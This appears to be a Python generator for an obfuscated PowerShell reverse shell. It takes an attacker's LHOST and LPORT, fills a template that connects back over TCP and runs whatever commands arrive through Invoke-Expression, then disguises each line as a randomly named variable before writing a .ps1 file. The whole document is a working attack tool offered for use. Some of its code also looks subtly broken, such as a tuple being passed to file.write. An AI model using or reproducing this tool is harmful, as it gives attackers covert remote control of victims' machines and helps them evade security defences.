import random

def gen_obfuscated_code(input_str):
    obfuscated_code = ''
    variables = []

    lines = input_str.split('\n')
    for line in lines:
        if line.strip() != '':
            variable_name = random_string(10)
            variables.append(variable_name)
            obfuscated_line = f"${variable_name} = '{line}'"
            obfuscated_code += obfuscated_line + '\n'

    obfuscated_code += f'$main = "${"`n$".join(variables)}"'
    obfuscated_code += '\nInvoke-Expression $main'
    variable_calls = ''
    for variable in variables:
        variable_calls += f"${variable}"
        variable_calls += '\n'

    return obfuscated_code.strip(), variable_calls.strip()

def random_string(length):
    letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.choice(letters) for _ in range(length))

def main():
    
    LHOST = input("Enter LHOST: ")
    LPORT = input("Enter LPORT: ")

    
    input_code = f'''$5f42fd19c74c49aa9853bf5cc59ea009 = "{LHOST}"
$964823d889b24b32ab50639b3200558a = "{LPORT}"
function prompt {{
    "powershell==> "
}}
$324add2cb7df42bcbb996369abde03a9 = New-Object Net.Sockets.TCPClient($5f42fd19c74c49aa9853bf5cc59ea009, $964823d889b24b32ab50639b3200558a)
$2f7da12e051641ee8194cd0f02286986 = $324add2cb7df42bcbb996369abde03a9.GetStream()
$9b5243417c7448bf90f85b067877c3b4 = New-Object IO.StreamWriter($2f7da12e051641ee8194cd0f02286986)

function WriteToStream ($String) {{
    $c4ac551ea3994544945724119c81f3ad = [System.Text.Encoding]::UTF8.GetBytes($String)
    $2f7da12e051641ee8194cd0f02286986.Write($c4ac551ea3994544945724119c81f3ad, 0, $c4ac551ea3994544945724119c81f3ad.Length)
    $2f7da12e051641ee8194cd0f02286986.Flush()
}}

$fd70ef1f10f74ad4ae5184d09a6b76f8 = (Get-Command powershell.exe).Path

while($true) {{
    try {{
        $c4ac551ea3994544945724119c81f3ad = New-Object Byte[] 1024
        $d128584882f44d6da4567fa6e0eebe62 = $2f7da12e051641ee8194cd0f02286986.Read($c4ac551ea3994544945724119c81f3ad, 0, $c4ac551ea3994544945724119c81f3ad.Length)

        if ($d128584882f44d6da4567fa6e0eebe62 -gt 0) {{
            $a5ca2edfe4f5471bbae2b89f7067578d = [System.Text.Encoding]::UTF8.GetString($c4ac551ea3994544945724119c81f3ad, 0, $d128584882f44d6da4567fa6e0eebe62)

            # Check if the command is valid
            if (Test-Path $fd70ef1f10f74ad4ae5184d09a6b76f8) {{
                $4f843350e4f84fbeba51efccbc47d188 = Invoke-Expression $a5ca2edfe4f5471bbae2b89f7067578d 2>&1 | Out-String
                WriteToStream($4f843350e4f84fbeba51efccbc47d188)
            }} else {{
                WriteToStream("Invalid command: $a5ca2edfe4f5471bbae2b89f7067578d")
            }}
        }}

        if ($2f7da12e051641ee8194cd0f02286986.DataAvailable -eq $false) {{
            $7aefead277904342b0fc67c5f5b7e399 = prompt
            WriteToStream($7aefead277904342b0fc67c5f5b7e399)
        }}
    }} catch [System.IO.IOException] {{
        # Handle the exception when CTRL+C is sent
        break
    }} catch {{
        $ErrorMessage = "An error occurred: $($_.Exception.Message)"
        WriteToStream($ErrorMessage)
        continue
    }}
}}

$9b5243417c7448bf90f85b067877c3b4.Close()
$324add2cb7df42bcbb996369abde03a9.Close()


'''

    # Generate obfuscated code and variable calls
    obfuscated_code = gen_obfuscated_code(input_code)

    # Save the obfuscated code to a file
    with open('obfuscated_code.ps1', 'w') as file:
        file.write(obfuscated_code)
    print("Obfuscated code saved to 'obfuscated_code.ps1'")

if __name__ == '__main__':
    main()

